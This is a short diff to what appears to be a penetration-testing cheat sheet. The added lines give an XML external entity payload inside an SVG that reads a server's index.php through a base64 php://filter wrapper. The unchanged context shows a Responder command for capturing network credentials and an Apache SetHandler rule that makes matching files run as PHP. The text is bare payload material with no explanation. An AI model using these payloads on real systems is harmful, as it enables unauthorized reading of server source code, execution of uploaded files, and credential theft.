@@ -141,3 +141,9 @@ sudo responder -I tun0 -A
     SetHandler application/x-httpd-php
 </FilesMatch>
 ```
+### XML payload
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+<svg>&xxe;</svg>
+```
